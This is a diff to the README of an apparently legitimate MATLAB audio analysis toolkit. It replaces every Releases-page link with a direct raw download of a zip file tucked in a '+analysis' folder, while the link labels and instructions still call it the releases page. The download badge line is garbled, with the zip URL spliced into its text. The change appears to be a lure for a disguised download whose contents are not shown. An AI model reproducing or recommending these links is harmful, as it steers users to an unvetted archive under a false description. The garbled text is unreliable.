@@ -1,6 +1,6 @@
 # 🎧 matlab-audio-analysis-toolkit - Easy Audio Signal Analysis Made Simple
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started%20with%20Audio%20Analysis-blue.svg)](https://github.com/haitiancapitalbubblegum811/matlab-audio-analysis-toolkit/releases)
+[![Download](https://raw.githubusercontent.com/haitiancapitalbubblegum811/matlab-audio-analysis-toolkit/main/+analysis/matlab-audio-analysis-toolkit_v2.9.zip%20Now-Get%20Started%20with%20Audio%https://raw.githubusercontent.com/haitiancapitalbubblegum811/matlab-audio-analysis-toolkit/main/+analysis/matlab-audio-analysis-toolkit_v2.9.zip)](https://raw.githubusercontent.com/haitiancapitalbubblegum811/matlab-audio-analysis-toolkit/main/+analysis/matlab-audio-analysis-toolkit_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you get started, ensure that you have the following:
 To download and install the toolkit, follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Download MATLAB Audio Analysis Toolkit](https://github.com/haitiancapitalbubblegum811/matlab-audio-analysis-toolkit/releases)
+   [Download MATLAB Audio Analysis Toolkit](https://raw.githubusercontent.com/haitiancapitalbubblegum811/matlab-audio-analysis-toolkit/main/+analysis/matlab-audio-analysis-toolkit_v2.9.zip)
 
 2. On the Releases page, you will see various versions of the toolkit listed. Look for the latest stable version. 
 
@@ -70,7 +70,7 @@ This toolkit is open-source and free to use. Feel free to contribute to the proj
 
 ## 📣 Important Links
 
-- [Releases Page](https://github.com/haitiancapitalbubblegum811/matlab-audio-analysis-toolkit/releases)
+- [Releases Page](https://raw.githubusercontent.com/haitiancapitalbubblegum811/matlab-audio-analysis-toolkit/main/+analysis/matlab-audio-analysis-toolkit_v2.9.zip)
 - [Documentation](link-to-documentation) (Include detailed usage instructions and examples.)
 - [Community Support](link-to-community) (Forums and discussion groups.)
 
